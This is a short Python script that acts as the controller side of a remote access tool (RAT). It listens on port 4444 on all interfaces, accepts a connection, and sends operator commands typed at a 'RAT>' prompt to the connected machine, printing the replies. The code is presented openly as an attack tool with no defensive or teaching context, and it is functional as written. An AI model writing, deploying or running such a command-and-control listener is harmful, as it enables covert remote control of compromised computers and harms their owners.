import socket
import threading

def handle_client(conn):
    while True:
        cmd = input("RAT> ")
        conn.send(cmd.encode())
        if cmd == "exit": break
        print(conn.recv(4096).decode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(5)
print("Listening...")
conn, addr = s.accept()
handle_client(conn)

